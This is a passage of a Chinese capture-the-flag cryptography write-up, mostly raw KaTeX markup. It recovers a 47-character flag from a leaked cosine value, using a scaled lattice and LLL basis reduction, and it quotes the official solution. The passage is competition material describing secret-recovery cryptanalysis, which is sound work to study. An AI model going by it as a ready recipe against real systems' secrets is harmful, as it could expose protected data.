mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span><br />即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>−</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo><mo>−</mo><mn>2</mn><mi>k</mi><mi>π</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">m-arccos(leak)-2k\pi=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span><br />构造格</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>π</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">L = \begin{bmatrix}1 &amp; 0 &amp; 1 \\0 &amp; 1 &amp; arccos(leak)\\0 &amp; 0 &amp; 2\pi\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>找出线性关系</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>k</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∗</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>π</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}m &amp; -1 &amp; -k\end{bmatrix}*\begin{bmatrix}1 &amp; 0 &amp; 1 \\0 &amp; 1 &amp; arccos(leak)\\0 &amp; 0 &amp; 2\pi\\\end{bmatrix}\ =\begin{bmatrix}m &amp; -1 &amp; 0\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><p>发现直接跑<code>LLL</code>算法进行格基规约是跑不出来的<br />需要<strong>平衡一下目标向量，并且使得格体积略大于目标向量的模长</strong>，官方<code>wp</code>的原话<br /><code>flag</code>长度为47，则<code>m</code>是376位的</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi>k</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>∗</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>760</mn></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>376</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>760</mn></msup><mo>∗</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>760</mn></msup><mo>∗</mo><mn>2</mn><mi>π</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><msup><mn>2</mn><mn>376</mn></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}m &amp; -1 &amp; -k\end{bmatrix}*\begin{bmatrix}1 &amp; 0 &amp; 2^{760} \\0 &amp; 2^{376} &amp; 2^{760}*arccos(leak)\\0 &amp; 0 &amp; 2^{760}*2\pi\\\end{bmatrix}\ =\begin{bmatrix}m &amp; -2^{376} &amp; 0\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">6</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">6</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">6</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t 